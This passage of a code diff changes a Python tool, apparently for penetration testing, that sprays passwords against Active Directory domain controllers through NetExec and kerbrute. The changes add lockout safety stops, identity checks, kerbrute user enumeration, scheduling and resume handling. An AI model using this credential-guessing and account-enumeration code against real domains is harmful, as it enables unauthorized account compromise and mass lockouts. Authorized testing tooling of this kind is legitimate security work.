+                        result.abort_reason = "identity-mismatch"
+                        result.errors.append(f"expected {expected_user}, parsed {user}")
+                        _stop_process(proc)
+                        break
+                    secret_hit = secret
+                    pair = (user, secret_hit)
+                    if pair not in result.admin_users:
+                        result.admin_users.append(pair)
                     # Also add to successes since it's a valid credential
-                    result.successes.append((user, secret_hit))
+                    if pair not in result.successes:
+                        result.successes.append(pair)
+                    result.terminal_users.add(user)
                     ui.update_admin(user, secret_hit)
-                    state.add_cred(user, secret_hit, is_admin=True)
-                    state.mark_attempted(secret, user)  # Feature 1: Track attempted pair
+                    state.finish_attempt(
+                        secret,
+                        user,
+                        "admin_success",
+                        persist=False,
+                    )
+                    state.add_cred(
+                        user,
+                        secret_hit,
+                        is_admin=True,
+                        engine=str(engine),
+                        persist=False,
+                    )
+                    state.save()
 
             elif line_type == LineType.LOCKOUT:
-                user_lock = data if data else "(unknown)"
-                result.lockouts.add(user_lock)
-                ui.update_lockout(user_lock)
-                state.add_lockout(user_lock)
-                if user_lock != "(unknown)":
-                    state.mark_attempted(secret, user_lock)  # Feature 1: Track attempted pair
+                saw_auth_result = True
+                signal_key = ANSI_ESCAPE_RE.sub("", line).strip().casefold()
+                if signal_key in seen_signal_lines:
+                    continue
+                seen_signal_lines.add(signal_key)
+                reported = data or expected_user
+                user_lock = _normalize_reported_user(reported, cfg.users, cfg.domain) if reported else None
+                if user_lock and expected_key and canonical_identity(user_lock, cfg.domain) != expected_key:
+                    result.aborted = True
+                    result.abort_reason = "identity-mismatch"
+                    result.errors.append(f"expected {expected_user}, parsed {user_lock}")
+                    _stop_process(proc)
+                    break
+                if user_lock:
+                    result.lockouts.add(user_lock)
+                    result.terminal_users.add(user_lock)
+                    state.finish_attempt(
+                        secret,
+                        user_lock,
+                        "lockout",
+                        persist=False,
+                    )
+                else:
+                    result.unknown_lockouts += 1
+                signal_added = state.add_lockout(
+                    user_lock,
+                    certainty="definitive",
+                    engine=engine.tool,
+                    protocol=engine.protocol or "",
+                    secret=secret,
+                    raw_line=line,
+                    persist=False,
+                )
+                state.save()
+                if signal_added:
+                    ui.update_lockout(user_lock)
+
+                lockout_abort_reason = ""
+                if engine.tool == "kerbrute":
+                    lockout_abort_reason = "lockout-safety-stop"
+                elif (state.lockout_count >= cfg.lockout_threshold and
+                      state.lockout_count > state.acknowledged_lockouts):
+                    lockout_abort_reason = "lockout-threshold"
+
+                if lockout_abort_reason:
+                    _stop_process(proc)
+                    result.aborted = True
+                    result.abort_reason = lockout_abort_reason
+                    ui.set_abort(result.abort_reason)
+                    break
+
+            elif line_type == LineType.AMBIGUOUS_LOCKOUT:
+                saw_auth_result = True
+                signal_key = ANSI_ESCAPE_RE.sub("", line).strip().casefold()
+                if signal_key in seen_signal_lines:
+                    continue
+                seen_signal_lines.add(signal_key)
+                reported = data or expected_user
+                user_signal = _normalize_reported_user(reported, cfg.users, cfg.domain) if reported else None
+                if user_signal and expected_key and canonical_identity(user_signal, cfg.domain) != expected_key:
+                    result.aborted = True
+                    result.abort_reason = "identity-mismatch"
+                    result.errors.append(f"expected {expected_user}, parsed {user_signal}")
+                    _stop_process(proc)
+                    break
+                if user_signal:
+                    result.ambiguous_lockouts.add(user_signal)
+                    result.terminal_users.add(user_signal)
+                    state.finish_attempt(
+                        secret,
+                        user_signal,
+                        "ambiguous_lockout",
+                        persist=False,
+                    )
+                else:
+                    result.unknown_ambiguous_lockouts += 1
+                signal_added = state.add_lockout(
+                    user_signal,
+                    certainty="ambiguous",
+                    engine=engine.tool,
+                    protocol=engine.protocol or "",
+                    secret=secret,
+                    raw_line=line,
+                    persist=False,
+                )
+                state.save()
+                if signal_added:
+                    ui.update_lockout(user_signal)
+                _stop_process(proc)
+                result.aborted = True
+                result.abort_reason = "lockout-safety-stop"
+                ui.set_abort(result.abort_reason)
+                break
 
             elif line_type == LineType.ERROR:
                 # Tool-level error (wrong realm, domain mismatch, etc.)
@@ -1391,34 +3728,70 @@ def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichU
                 ui.update_error(error_msg)
                 ui.console.print(f"[!] Tool error: {error_msg}", style="red")
 
-                # If we get critical errors, abort this engine immediately
                 if any(kw in error_msg.lower() for kw in ["wrong realm", "cannot find kdc", "no kdc", "unknown realm"]):
-                    proc.terminate()
-                    try:
-                        proc.wait(timeout=2)
-                    except subprocess.TimeoutExpired:
-                        proc.kill()
+                    _stop_process(proc)
                     result.aborted = True
                     result.abort_reason = "wrong-realm"
                     break
+                if any(re.search(pat, error_msg, re.IGNORECASE) for pat in NXC_FATAL_ERROR_PATTERNS):
+                    _stop_process(proc)
+                    result.aborted = True
+                    result.abort_reason = "tool-error"
+                    break
 
             elif line_type == LineType.AUTHFAIL:
-                # Track attempted user for cred-reuse matrix (Feature 1)
-                if data:
-                    state.mark_attempted(secret, data)
+                saw_auth_result = True
+                reported = data or expected_user
+                if reported:
+                    user = _normalize_reported_user(reported, cfg.users, cfg.domain)
+                    if expected_key and canonical_identity(user, cfg.domain) != expected_key:
+                        result.aborted = True
+                        result.abort_reason = "identity-mismatch"
+                        result.errors.append(f"expected {expected_user}, parsed {user}")
+                        _stop_process(proc)
+                        break
+                    result.terminal_users.add(user)
+                    state.finish_attempt(secret, user, "auth_failure")
 
             elif line_type == LineType.CONN_ERROR:
-                # Track connection errors for stats/throttling, but don't abort
-                # Individual engines may have issues (e.g., kerbrute KDC errors)
-                # As long as one engine in the failover chain works, we continue
+                # Track connection errors for stats/throttling. The completed
+                # invocation is classified as failed below so failover can run.
                 result.conn_fails += 1
                 ui.increment_conn_fails()
-                # No longer abort on conn-fail-limit - let failover chain handle it
+
+            elif line_type == LineType.SUMMARY:
+                try:
+                    result.summary_tested = int(data) if data is not None else None
+                except ValueError:
+                    result.summary_tested = None
 
         # Wait for normal completion if not aborted
         if not result.aborted:
             return_code = proc.wait(timeout=10)
-            result.clean_finish = (return_code == 0)
+            if result.conn_fails:
+                result.aborted = True
+                result.abort_reason = "connection-errors"
+            elif return_code != 0:
+                result.aborted = True
+                result.abort_reason = f"exit-code-{return_code}"
+            elif not saw_auth_result or not result.terminal_users:
+                result.aborted = True
+                result.abort_reason = "no-auth-results"
+            elif engine.tool == "kerbrute" and result.summary_tested is None:
+                result.aborted = True
+                result.abort_reason = "missing-summary"
+            elif engine.tool == "kerbrute" and result.summary_tested != 1:
+                result.aborted = True
+                result.abort_reason = "summary-mismatch"
+            elif expected_key and not any(
+                canonical_identity(user, cfg.domain) == expected_key
+                for user in result.terminal_users
+            ):
+                result.aborted = True
+                result.abort_reason = "identity-mismatch"
+            else:
+                result.clean_finish = True
+                result.reconciled_complete = True
 
     except FileNotFoundError:
         ui.console.print(f"[!] Command not found: {cmd[0]}", style="red")
@@ -1426,14 +3799,31 @@ def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichU
         result.abort_reason = "command-not-found"
 
     except subprocess.TimeoutExpired:
+        _stop_process(proc)
         ui.console.print("[!] Subprocess timed out", style="red")
         result.aborted = True
         result.abort_reason = "timeout"
 
+    except EngineOutputTimeout as exc:
+        _stop_process(proc)
+        ui.console.print(f"[!] Engine stopped after {exc.reason}", style="red")
+        result.aborted = True
+        result.abort_reason = exc.reason
+
     except Exception as e:
+        _stop_process(proc)
         ui.console.print(f"[!] Exception running engine: {e}", style="red")
         result.aborted = True
         result.abort_reason = f"exception-{type(e).__name__}"
+
+    finally:
+        if state.active_process is proc:
+            state.active_process = None
+        if secret_file_path:
+            try:
+                Path(secret_file_path).unlink()
+            except FileNotFoundError:
+                pass
 
     return result
 
@@ -1441,7 +3831,11 @@ def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichU
 # Preflight check
 # =============================================================================
 
-def preflight(cfg: Config, ui: RichUI) -> Tuple[bool, str]:
+def preflight(
+    cfg: Config,
+    ui: RichUI,
+    state: Optional[State] = None,
+) -> Tuple[bool, str]:
     """
     Perform preflight: reachability + domain validation.
     Returns (ok, detail_message).
@@ -1455,9 +3849,9 @@ def preflight(cfg: Config, ui: RichUI) -> Tuple[bool, str]:
     ports_to_check = []
     if cfg.tool == "nxc":
         if cfg.protocol == "smb":
-            ports_to_check = [445, 88]  # SMB + Kerberos
+            ports_to_check = [445]
         elif cfg.protocol == "ldap":
-            ports_to_check = [389, 636, 88]  # LDAP/LDAPS + Kerberos
+            ports_to_check = [389, 636]  # Either LDAP or LDAPS is sufficient
     elif cfg.tool == "kerbrute":
         ports_to_check = [88]  # Kerberos
 
@@ -1478,7 +3872,7 @@ def preflight(cfg: Config, ui: RichUI) -> Tuple[bool, str]:
         return False, msg
 
     # 2. Domain check: nxc probe (or kerbrute fallback)
-    if cfg.nxc_binary:
+    if cfg.tool == "nxc" and cfg.nxc_binary:
         try:
             cmd = [cfg.nxc_binary]
             if cfg.protocol == "smb":
@@ -1487,31 +3881,63 @@ def preflight(cfg: Config, ui: RichUI) -> Tuple[bool, str]:
                 cmd.extend(["ldap", cfg.dc_ip, "-d", cfg.domain])
 
             # Quick probe without creds
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+            probe = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                start_new_session=True,
+            )
+            if state is not None:
+                state.active_process = probe
+            stdout, stderr = probe.communicate(timeout=15)
+            if probe.returncode != 0:
+                return False, f"nxc probe exited with status {probe.returncode}"
 
             # Parse domain from output
-            output = result.stdout + result.stderr
-            # nxc reports domain/NetBIOS in various formats; do a fuzzy check
-            domain_upper = cfg.domain.upper()
-            if domain_upper in output.upper():
+            output = stdout + stderr
+            # NetExec may report either the DNS realm or NetBIOS short name.
+            # Match whole tokens so LAB does not accidentally match LABEL.
+            domain_upper = cfg.domain.upper().rstrip(".")
+            domain_candidates = {domain_upper, domain_upper.split(".", 1)[0]}
+            output_upper = output.upper()
+            domain_confirmed = any(
+                re.search(
+                    rf"(?<![A-Z0-9_.-]){re.escape(candidate)}(?![A-Z0-9_.-])",
+                    output_upper,
+                )
+                for candidate in domain_candidates
+                if candidate
+            )
+            if domain_confirmed:
                 ui.console.print(f"  [+] Domain '{cfg.domain}' confirmed in DC response", style="green")
                 return True, "Preflight passed"
             else:
                 msg = f"Domain '{cfg.domain}' not found in DC response (possible mismatch)"
-                ui.console.print(f"  [-] {msg}", style="yellow")
-                ui.console.print(f"     (DC may be reporting a different domain/NetBIOS name)", style="dim")
-                ui.alert("Preflight Warning", msg + ". Continue at your own risk.", "yellow")
-                return True, "Preflight passed with warning"  # Allow proceeding with a warning
+                ui.console.print(f"  [-] {msg}", style="red")
+                ui.console.print("     (DC may be reporting a different domain/NetBIOS name)", style="dim")
+                ui.alert("Preflight Failed", msg, "red")
+                return False, msg
 
+        except (KeyboardInterrupt, SystemExit):
+            _stop_process(locals().get("probe"))
+            raise
         except subprocess.TimeoutExpired:
+            _stop_process(locals().get("probe"))
             msg = "nxc probe timed out"
-            ui.console.print(f"  [-] {msg}", style="yellow")
-            return True, "Preflight passed with warning"  # Continue
+            ui.console.print(f"  [-] {msg}", style="red")
+            return False, msg
         except Exception as e:
-            ui.console.print(f"  [-] nxc probe error: {e}", style="dim")
-            # Fallback to just reachability check which already passed
+            _stop_process(locals().get("probe"))
+            msg = f"nxc probe error: {e}"
+            ui.console.print(f"  [-] {msg}", style="red")
+            return False, msg
+        finally:
+            if state is not None and state.active_process is locals().get("probe"):
+                state.active_process = None
 
-    # Fallback for kerbrute-only: we already checked port 88, consider that enough
+    # Kerbrute validates its realm during the first strictly controlled attempt;
+    # preflight establishes that the explicitly selected KDC is reachable.
     ui.console.print("  [+] Preflight complete (reachability verified)", style="green")
     return True, "Preflight passed"
 
@@ -1519,18 +3945,43 @@ def preflight(cfg: Config, ui: RichUI) -> Tuple[bool, str]:
 # Feature 2: Filter disabled/non-existent accounts
 # =============================================================================
 
-def enumerate_valid_users(cfg: Config, ui: RichUI, console: Console) -> List[str]:
+def enumerate_valid_users(
+    cfg: Config,
+    ui: RichUI,
+    console: Console,
+    state: Optional[State] = None,
+) -> List[str]:
     """
     Run kerbrute userenum to filter out non-existent accounts.
-    Returns list of valid users (falls back to full list on error).
+    Returns configured display identities proven to exist. Enumeration failures
+    fail closed rather than silently restoring the full list.
     """
     if not cfg.kerbrute_binary:
-        console.print("[!] kerbrute binary not found; skipping user filtering", style="yellow")
-        return cfg.users
+        raise RuntimeError("Kerbrute is required for --exclude-unknown-users")
 
     console.print("[*] Enumerating valid users with kerbrute userenum...", style="cyan")
 
-    cmd = [cfg.kerbrute_binary, "userenum", "--dc", cfg.dc_ip, "-d", cfg.domain, cfg.userfile]
+    fd, enum_userfile = tempfile.mkstemp(prefix="authtempo-enum-", suffix=".txt")
+    try:
+        os.fchmod(fd, 0o600)
+        with os.fdopen(fd, "w", encoding="utf-8") as handle:
+            fd = -1
+            handle.write("\n".join(cfg.users) + "\n")
+            handle.flush()
+            os.fsync(handle.fileno())
+    finally:
+        if fd >= 0:
+            os.close(fd)
+
+    cmd = [
+        cfg.kerbrute_binary,
+        "userenum",
+        "--dc",
+        cfg.dc_ip,
+        "-d",
+        cfg.domain,
+        enum_userfile,
+    ]
 
     try:
         proc = subprocess.Popen(
@@ -1539,37 +3990,150 @@ def enumerate_valid_users(cfg: Config, ui: RichUI, console: Console) -> List[str
             stderr=subprocess.STDOUT,
             text=True,
             bufsize=1,
+            start_new_session=True,
         )
+        if state is not None:
+            state.active_process = proc
 
-        valid_users = set()
-        for line in proc.stdout:
+        valid_keys: Set[str] = set()
+        summary_tested: Optional[int] = None
+        seen_safety_lines: Set[str] = set()
+        for line in _iter_process_output(
+            proc,
+            total_timeout=cfg.engine_timeout_seconds,
+            idle_timeout=cfg.engine_idle_timeout_seconds,
+        ):
             line = line.rstrip()
             if not line:
                 continue
+            console.print(Text(line))
+            if state is not None:
+                state._log_line(f"{datetime.datetime.now().isoformat()}  USERENUM {line}")
 
-            # kerbrute userenum format: [+] VALID USERNAME: user@domain
-            if "[+] VALID USERNAME:" in line:
-                m = re.search(r"[+] VALID USERNAME:\s+(\S+)", line)
-                if m:
-                    username_full = m.group(1)
-                    # Extract username before @
-                    username = username_full.split("@")[0]
-                    valid_users.add(username)
+            parsed_line = ANSI_ESCAPE_RE.sub("", line)
+            summary = re.search(
+                r"Done!\s+Tested\s+(\d+)\s+(?:usernames?|logins?)",
+                parsed_line,
+                re.IGNORECASE,
+            )
+            if summary:
+                summary_tested = int(summary.group(1))
+
+            # Kerbrute also reports valid principals accompanied by policy errors.
+            valid_match = re.search(
+                r"\[\+\]\s+VALID USERNAME(?: WITH ERROR)?:\s+(\S+)",
+                parsed_line,
+                re.IGNORECASE,
+            )
+            reported_principal = valid_match.group(1) if valid_match else None
+            if reported_principal is None:
+                principal_match = re.search(
+                    r"\b([A-Za-z0-9_.\-$]+@[A-Za-z0-9_.-]+)\b",
+                    parsed_line,
+                )
+                reported_principal = (
+                    principal_match.group(1) if principal_match else None
+                )
+
+            enumeration_status_text = parsed_line
+            if valid_match:
+                enumeration_status_text = parsed_line[valid_match.end():]
+            elif reported_principal:
+                principal_offset = parsed_line.find(reported_principal)
+                if principal_offset >= 0:
+                    enumeration_status_text = parsed_line[
+                        principal_offset + len(reported_principal):
+                    ]
+
+            signal_certainty: Optional[str] = None
+            if any(
+                re.search(pattern, enumeration_status_text, re.IGNORECASE)
+                for pattern in KERBRUTE_LOCKOUT_PATTERNS
+            ):
+                signal_certainty = "definitive"
+            elif any(
+                re.search(pattern, enumeration_status_text, re.IGNORECASE)
+                for pattern in KERBRUTE_AMBIGUOUS_LOCKOUT_PATTERNS
+            ):
+                signal_certainty = "ambiguous"
+
+            if signal_certainty is not None:
+                signal_key = parsed_line.strip().casefold()
+                if signal_key not in seen_safety_lines:
+                    seen_safety_lines.add(signal_key)
+                    normalized_user = (
+                        _normalize_reported_user(
+                            reported_principal,
+                            cfg.users,
+                            cfg.domain,
+                        )
+                        if reported_principal
+                        else None
+                    )
+                    if normalized_user and canonical_identity(
+                        normalized_user, cfg.domain
+                    ) not in {
+                        canonical_identity(user, cfg.domain)
+                        for user in cfg.users
+                    }:
+                        normalized_user = None
+                    if normalized_user:
+                        valid_keys.add(
+                            canonical_identity(normalized_user, cfg.domain)
+                        )
+                    if state is not None:
+                        state.add_lockout(
+                            normalized_user,
+                            certainty=signal_certainty,
+                            engine="kerbrute",
+                            protocol="userenum",
+                            secret=None,
+                            raw_line=line,
+                            stage="identity_enumeration",
+                        )
+                    console.print(
+                        "    [!] Identity enumeration reported a "
+                        f"{signal_certainty} lockout/revocation signal for "
+                        f"{escape(normalized_user or '(unknown)')}",
+                        style="yellow",
+                    )
+
+            if valid_match:
+                valid_keys.add(
+                    canonical_identity(valid_match.group(1), cfg.domain)
+                )
 
         return_code = proc.wait(timeout=10)
 
-        if return_code == 0 and valid_users:
-            console.print(f"    [+] Found {len(valid_users)} valid users", style="green")
-            return sorted(valid_users)
-        else:
-            console.print("    [-] kerbrute userenum failed or returned no results", style="yellow")
-            console.print("    [*] Falling back to full user list", style="dim")
-            return cfg.users
+        if return_code != 0:
+            raise RuntimeError(f"Kerbrute user enumeration exited with status {return_code}")
+        if summary_tested != len(cfg.users):
+            raise RuntimeError(
+                "Kerbrute user enumeration did not reconcile: "
+                f"expected {len(cfg.users)}, summary reported {summary_tested!r}"
+            )
+        if not valid_keys:
+            raise RuntimeError("Kerbrute user enumeration returned no valid identities")
+        valid_users = [
+            user for user in cfg.users
+            if canonical_identity(user, cfg.domain) in valid_keys
+        ]
+        console.print(f"    [+] Found {len(valid_users)} valid users", style="green")
+        return valid_users
 
+    except (KeyboardInterrupt, SystemExit):
+        _stop_process(locals().get("proc"))
+        raise
     except Exception as e:
-        console.print(f"    [-] Error running kerbrute userenum: {e}", style="yellow")
-        console.print("    [*] Falling back to full user list", style="dim")
-        return cfg.users
+        _stop_process(locals().get("proc"))
+        raise RuntimeError(f"Kerbrute user enumeration failed: {e}") from e
+    finally:
+        if state is not None and state.active_process is locals().get("proc"):
+            state.active_process = None
+        try:
+            Path(enum_userfile).unlink()
+        except FileNotFoundError:
+            pass
 
 # =============================================================================
 # Feature B: Spray window scheduling
@@ -1580,7 +4144,7 @@ class SprayWindow:
 
     def __init__(self, spec: str):
         """Parse preset or 'HH:MM-HH:MM' range."""
-        self.spec = spec.lower()
+        self.spec = spec.strip().lower()
         self.start_minute = None  # minutes since midnight
         self.end_minute = None
         self.days = set()  # 0=Mon,...,6=Sun; empty=all days
@@ -1602,24 +4166,24 @@ class SprayWindow:
 
     def _parse_range(self):
         """Parse custom range like '09:00-17:00' or '9-17'."""
-        try:
-            parts = self.spec.split("-")
-            if len(parts) != 2:
-                raise ValueError("Invalid range format")
+        match = re.fullmatch(
+            r"\s*(\d{1,2})(?::(\d{2}))?\s*-\s*(\d{1,2})(?::(\d{2}))?\s*",
+            self.spec,
+        )
+        if not match:
+            raise ValueError("expected business-hours, off-hours, or HH:MM-HH:MM")
 
-            def parse_minutes(t):
-                if ":" in t:
-                    h, m = t.split(":")
-                    return int(h) * 60 + int(m)
-                else:
-                    return int(t) * 60
+        start_h, start_m, end_h, end_m = match.groups()
+        start_hour, start_minute = int(start_h), int(start_m or 0)
+        end_hour, end_minute = int(end_h), int(end_m or 0)
+        if not (0 <= start_hour <= 23 and 0 <= end_hour <= 23 and
+                0 <= start_minute <= 59 and 0 <= end_minute <= 59):
+            raise ValueError("hours must be 00-23 and minutes must be 00-59")
 
-            self.start_minute = parse_minutes(parts[0])
-            self.end_minute = parse_minutes(parts[1])
-        except Exception:
-            # Default to unrestricted if parse fails
-            self.start_minute = 0
-            self.end_minute = 24 * 60
+        self.start_minute = start_hour * 60 + start_minute
+        self.end_minute = end_hour * 60 + end_minute
+        if self.start_minute == self.end_minute:
+            raise ValueError("start and end times must differ")
 
     def is_in_window(self, now: Optional[datetime.datetime] = None) -> bool:
         """Check if current time is within the spray window."""
@@ -1679,8 +4243,9 @@ class SprayWindow:
             candidate = now.replace(hour=self.start_minute // 60,
                                     minute=self.start_minute % 60,
                                     second=0, microsecond=0)
-            while (candidate.weekday() in self.days and self.days and
-                   candidate <= now):
+            if candidate <= now:
+                candidate += datetime.timedelta(days=1)
+            while self.days and candidate.weekday() not in self.days:
                 candidate += datetime.timedelta(days=1)
             return int((candidate - now).total_seconds())
 
@@ -1718,7 +4283,8 @@ def wait_for_window(window: SprayWindow, ui: RichUI, console: Console, state: St
 # Engine health / demotion constants
 HARD_DEMOTE_REASONS = {"wrong-realm", "binary-not-found", "command-not-found",
                        "invalid-protocol", "pth-kerbrute-incompatible", "unknown-engine"}
-MAX_COOLDOWN = 30  # cap for exponential backoff
+MAX_COOLDOWN = 30  # default exponential cap; never shorten a larger operator value
+MAX_DEMOTE_COUNT = 32  # bound persisted exponent/counter work
 
 def derive_realm_candidates(domain: str) -> List[str]:
     """
@@ -1794,20 +4360,35 @@ def build_failover_chain(cfg: Config) -> List[Engine]:
 # Lockout handling
 # =============================================================================
 
-def handle_lockouts(round_lockouts: int, cumulative_lockouts: int, cfg: Config, ui: RichUI, console: Console) -> bool:
+def handle_lockouts(
+    pass_lockouts: int,
+    cumulative_lockouts: int,
+    cfg: Config,
+    ui: RichUI,
+    console: Console,
+    acknowledged_lockouts: int = 0,
+) -> bool:
     """
     Apply lockout rules. Returns True if run should continue, False if hard-stop.
-    - Burst rule: >= cfg.lockout_burst in one round → hard-stop.
+    - Per-pass rule: > cfg.lockout_burst for one secret → hard-stop.
     - Threshold rule: >= cfg.lockout_threshold cumulative → interactive prompt.
     """
-    if round_lockouts >= cfg.lockout_burst:
-        msg = f"[!] Hard-stop: {round_lockouts} lockouts in this round (burst threshold {cfg.lockout_burst}). Stopping the run to avoid mass lockout."
+    if pass_lockouts > cfg.lockout_burst:
+        msg = (
+            f"[!] Hard-stop: {pass_lockouts} lockout signals in this spray pass "
+            f"exceeded the maximum of {cfg.lockout_burst}. Stopping the run to "
+            "avoid further lockouts."
+        )
         console.print(msg, style="red")
-        ui.alert("LOCKOUT BURST - STOPPED", msg, "red")
+        ui.alert("LOCKOUT LIMIT - STOPPED", msg, "red")
         return False  # Do not continue
 
-    if cumulative_lockouts >= cfg.lockout_threshold:
-        msg = f"[*] Cumulative lockouts: {cumulative_lockouts} (threshold {cfg.lockout_threshold})."
+    if (cumulative_lockouts >= cfg.lockout_threshold and
+            cumulative_lockouts > acknowledged_lockouts):
+        msg = (
+            f"[*] Cumulative safety signals: {cumulative_lockouts} "
+            f"(review threshold {cfg.lockout_threshold})."
+        )
         console.print(msg, style="yellow")
         return prompt_continue(ui, console)
 
@@ -1815,7 +4396,11 @@ def handle_lockouts(round_lockouts: int, cumulative_lockouts: int, cfg: Config, 
 
 def prompt_continue(ui: RichUI, console: Console) -> bool:
     """Interactive prompt: continue (c) or quit (q). Returns True to continue."""
-    ui.alert("PAUSED", "Lockout threshold reached. Press 'c' to continue or 'q' to quit.", "yellow")
+    ui.alert(
+        "PAUSED",
+        "Safety-signal review threshold reached. Press 'c' to continue or 'q' to quit.",
+        "yellow",
+    )
 
     while True:
         try:
@@ -1836,50 +4421,145 @@ def prompt_continue(ui: RichUI, console: Console) -> bool:
 # Signal handling
 # =============================================================================
 
-def setup_signal_handler(state: State, console: Console):
-    """Register SIGINT handler to persist state on Ctrl-C."""
+def setup_signal_handler(state: State, console: Console, ui: Optional[RichUI] = None):
+    """Stop the active child and persist state on terminal/process signals."""
     def handler(signum, frame):
+        _stop_process(state.active_process)
+        if ui is not None:
+            ui.end_spray()
         console.print("\n[*] Interrupted. Saving state...", style="yellow")
         state.save()
+        state.close()
         console.print("[*] State saved. You can resume with --resume.", style="green")
-        sys.exit(130)  # Standard exit code for SIGINT
+        sys.exit(128 + int(signum or signal.SIGINT))
 
-    signal.signal(signal.SIGINT, handler)
+    signals = [signal.SIGINT, signal.SIGTERM]
+    if hasattr(signal, "SIGHUP"):
+        signals.append(signal.SIGHUP)
+    for sig in signals:
+        signal.signal(sig, handler)
 
 # =============================================================================
 # Main run loop
 # =============================================================================
 
-def run(cfg: Config, console: Console):
+def run(cfg: Config, console: Console) -> bool:
     """Main spray loop."""
-    ui = RichUI(console, max_feed_lines=cfg.feed_lines)
+    ui = RichUI(
+        console,
+        max_feed_lines=cfg.feed_lines,
+        live_ui=cfg.live_ui,
+        force_live=cfg.force_live_ui,
+    )
+
+    console.print(
+        f"[*] Lockout guard: at most {cfg.lockout_burst} signal(s) per "
+        f"secret/pass; signal {cfg.lockout_burst + 1} hard-stops the run.",
+        style="cyan",
+    )
+
+    if cfg.passwords_per_round > 1:
+        console.print(
+            f"[!] Safety notice: --limit {cfg.passwords_per_round} gives each account "
+            f"up to {cfg.passwords_per_round} attempts before the inter-batch delay. "
+            "Confirm this is below the authorized domain lockout policy.",
+            style="yellow",
+        )
+
+    # State schema v5 carries the exact effective identity set. It is restored
+    # under the output-directory lock before any target activity, so a missing
+    # convenience copy of active-users.txt cannot force re-enumeration.
+    filtered_users_pending = False
+    enumeration_safety_stop = False
+
+    # Validate/create state and hold the run-directory lock before any network
+    # activity, including preflight and optional identity enumeration.
+    state = State(cfg.log_dir, cfg)
+    setup_signal_handler(state, console, ui)
+    if cfg.filter_disabled and state.identity_filter_complete and cfg.resume:
+        # State is authoritative; refresh the convenience artifact even if a
+        # stale or edited copy already exists.
+        filtered_users_pending = True
 
     # Preflight
-    ok, detail = preflight(cfg, ui)
+    try:
+        ok, detail = preflight(cfg, ui, state)
+    except Exception:
+        state.close()
+        raise
     if not ok:
         console.print(f"[!] Preflight failed: {detail}", style="red")
         console.print("[!] Aborting. Fix the issue or use --no-preflight to bypass (not recommended).", style="yellow")
-        return
+        console.print(
+            "[*] Run state was retained; fix preflight and use --resume.",
+            style="yellow",
+        )
+        state.close()
+        return False
 
     # Feature 2: Filter disabled/non-existent accounts if requested
-    if cfg.filter_disabled and not cfg.dry_run:
+    if (
+        cfg.filter_disabled
+        and not cfg.dry_run
+        and not state.identity_filter_complete
+    ):
         original_count = len(cfg.users)
-        cfg.users = enumerate_valid_users(cfg, ui, console)
+        enumeration_source_users = list(cfg.users)
+        signals_before_enumeration = state.lockout_count
+        try:
+            enumerated_users = enumerate_valid_users(cfg, ui, console, state)
+        except Exception:
+            state.close()
+            raise
+        retained_keys = {
+            canonical_identity(user, cfg.domain) for user in enumerated_users
+        }
+        retained_keys.update(
+            canonical_identity(user, cfg.domain)
+            for user in state.known_signal_users()
+        )
+        cfg.users = [
+            user for user in enumeration_source_users
+            if canonical_identity(user, cfg.domain) in retained_keys
+        ]
         filtered_count = len(cfg.users)
         dropped = original_count - filtered_count
 
-        # Write filtered list to log dir
-        active_users_file = Path(cfg.log_dir) / "active-users.txt"
-        active_users_file.write_text("\n".join(cfg.users) + "\n")
-
+        state.set_effective_users(cfg.users)
+        filtered_users_pending = True
+        enumeration_safety_stop = (
+            state.lockout_count > signals_before_enumeration
+            or any(
+                event.get("stage") == "identity_enumeration"
+                for event in state.lockout_signals
+            )
+        )
         console.print(f"[*] Filtered: {filtered_count} valid of {original_count} total ({dropped} non-existent dropped)", style="green")
+
+    if filtered_users_pending:
+        active_users_file = state.log_dir / "active-users.txt"
+        state._atomic_write_text(active_users_file, "\n".join(cfg.users) + "\n")
         console.print(f"[*] Active users saved to: {active_users_file}", style="cyan")
+    ui.load_totals(
+        state.credential_pairs(),
+        state.admin_credential_pairs(),
+        state.known_signal_users(),
+        state.unknown_lockout_events,
+        state.lockout_count,
+    )
 
-    # Initialize state
-    state = State(cfg.log_dir, cfg)
-
-    # Setup signal handler for Ctrl-C
-    setup_signal_handler(state, console)
+    if enumeration_safety_stop:
+        message = (
+            "Identity enumeration produced lockout/revocation safety evidence. "
+            "The affected identities were quarantined and no password attempts "
+            "were dispatched. Review the evidence before an explicit --resume."
+        )
+        console.print(f"[!] {message}", style="red")
+        ui.alert("ENUMERATION SAFETY STOP", message, "red")
+        state.record_timeline_event("stopped", "identity-enumeration safety signal")
+        state.save()
+        state.close()
+        return False
 
     # Build failover chain
     chain = build_failover_chain(cfg)
@@ -1901,15 +4581,94 @@ def run(cfg: Config, console: Console):
             console.print("[*] kerbrute no longer in chain; cleared realm-retry memory", style="dim")
 
     # Main loop over password queue
-    round_idx = 0
-    cumulative_lockouts = len(state.locked_users)
+    window = SprayWindow(cfg.schedule) if cfg.schedule else None
+    stop_reason = ""
 
-    while state.remaining_queue:
+    # A resumed run may already contain unacknowledged lockouts. Do not spray
+    # another password until the operator explicitly accepts that state.
+    existing_lockouts = state.lockout_count
+    if (existing_lockouts >= cfg.lockout_threshold and
+            existing_lockouts > state.acknowledged_lockouts):
+        if handle_lockouts(
+            0, existing_lockouts, cfg, ui, console, state.acknowledged_lockouts
+        ):
+            state.acknowledged_lockouts = existing_lockouts
+            state.save()
+        else:
+            stop_reason = "operator stopped at lockout threshold"
+
+    # Preserve batch boundaries across interruption. A resume may finish only
+    # the unused slots from the interrupted batch; it cannot silently gain a
+    # fresh N-pass allowance. If the prior process died in the tiny gap after
+    # its final pass was saved, close that batch now and anchor a full delay.
+    if cfg.resume and state.remaining_queue and not stop_reason:
+        resume_progress = state.current_batch_progress()
+        if resume_progress == cfg.passwords_per_round:
+            state.mark_round_complete()
+            state.record_timeline_event(
+                "batch_end",
+                "recovered completed batch boundary during resume",
+                round_idx=state.completed_rounds,
+            )
+            state.save()
+            resume_progress = 0
+
+        if resume_progress == 0 and state.last_batch_completed_at:
+            delay_seconds = int(
+                cfg.time_between_rounds * 60 * state.delay_multiplier
+            )
+            completed_at = datetime.datetime.fromisoformat(
+                state.last_batch_completed_at
+            )
+            elapsed_seconds = (
+                datetime.datetime.now() - completed_at
+            ).total_seconds()
